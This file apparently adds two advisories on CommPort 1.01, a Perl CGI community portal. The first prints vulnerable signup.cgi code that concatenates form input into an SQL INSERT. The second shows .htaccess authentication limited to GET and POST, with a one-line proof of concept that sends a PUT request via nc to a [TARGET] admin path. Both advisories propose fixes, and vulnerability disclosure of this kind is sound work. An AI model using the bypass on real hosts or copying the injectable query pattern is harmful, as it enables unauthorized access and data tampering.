@@ -1,0 +1,137 @@
+--------------------------------------------
+CommPort 1.01 <= SQL Injection Vulnerability
+--------------------------------------------
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor information:
+
+"A 'Community Portal' generator that can be tailored for any location.
+Each user gets a personal portal page to which they can add their own
+'channels' or select from a growing list of pre-prepared local, national
+and international content. This allows any individual to always have a page
+of their own personal favourites in front of them. Channels may be either
+'active' with continually updated content such as weather or news headlines
+or 'passive' with collections of links."
+
+Vendor URI: http://www.tc.ca/commport/
+
+----------------------------------------------------
+
+Risk-level: High
+
+The application is prone to a SQL injection vulnerability.
+
+----------------------------------------------------
+
+signup.cgi, line 43:
+
+$Method = $ENV{'REQUEST_METHOD'};
+$PathInfo = $ENV{'PATH_INFO'};
+
+$Query = new CGI;
+
+if ($Method eq "POST") {
+   $UN = $Query->param("UN");
+   $PW1 = $Query->param("PW1");
+   $PW2 = $Query->param("PW2");
+   $EMail = $Query->param("EMail");
+   $FName = $Query->param("FName");
+   $LName = $Query->param("LName");
+   $Addr = $Query->param("Addr");
+   $City = $Query->param("City");
+   $Prov = $Query->param("Prov");
+   $PCode = $Query->param("PCode");
+   $Country = $Query->param("Country");
+
+
+----------------------------------------------------
+
+signup.cgi, line 226:
+
+   $cmd = "insert into User (un,pw,email,fname,lname,address,community,prov,postal,country,Joined) values "
+."(\"${UN}\",\"${PWC}\",\"${EMail}\",\"${FName}\",\"${LName}\",\"${Addr}\",\"${City}\",\"${Prov}\",\"${PCode}\",\"${Country}\",now())";
+
+   $sth = $dbh->do($cmd) || &DumpError($sth->errstr);
+
+----------------------------------------------------
+
+Solution:
+
+Do some input validation.
+
+----------------------------------------------------
+
+
+----------------------------------------------------
+CommPort 1.01 <= Authentication Bypass Vulnerability
+----------------------------------------------------
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor information:
+
+"A 'Community Portal' generator that can be tailored for any location.
+Each user gets a personal portal page to which they can add their own
+'channels' or select from a growing list of pre-prepared local, national
+and international content. This allows any individual to always have a page
+of their own personal favourites in front of them. Channels may be either
+'active' with continually updated content such as weather or news headlines
+or 'passive' with collections of links."
+
+Vendor URI: http://www.tc.ca/commport/
+
+----------------------------------------------------
+
+Risk-level: Medium/High
+
+The application is prone to an authentication bypass vulnerability.
+
+----------------------------------------------------
+
+/htdocs/cp/.htaccess:
+
+AuthName "Community Portal"
+AuthType Basic
+AuthUserFile /home/piwcommport/auth/.commport
+
+<limit GET POST>
+require valid-user
+</limit>
+
+ErrorDocument 401 /signup.cgi
+
+----------------------------------------------------
+
+/htdocs/cp/admin/.htaccess:
+
+AuthName "Community Portal"
+AuthType Basic
+AuthUserFile /home/piwcommport/auth/.commport
+
+<limit GET POST>
+require valid-user
+</limit>
+
+ErrorDocument 401 /signup.cgi
+
+----------------------------------------------------
+
+The application protects specific areas by using base authentication.
+
+Since the authentication is limited to GET and POST, it can be bypassed
+by using different or random request types.
+
+----------------------------------------------------
+
+Exploit / Proof Of Concept:
+
+$ perl -e 'print "PUT /cp/admin/ HTTP/1.0\n\n"' | nc [TARGET] 80
+
+-------------------------------------
+
+Solution:
+
+Remove the LIMIT directive from any htaccess file stored in the project directory.
+
+-------------------------------------
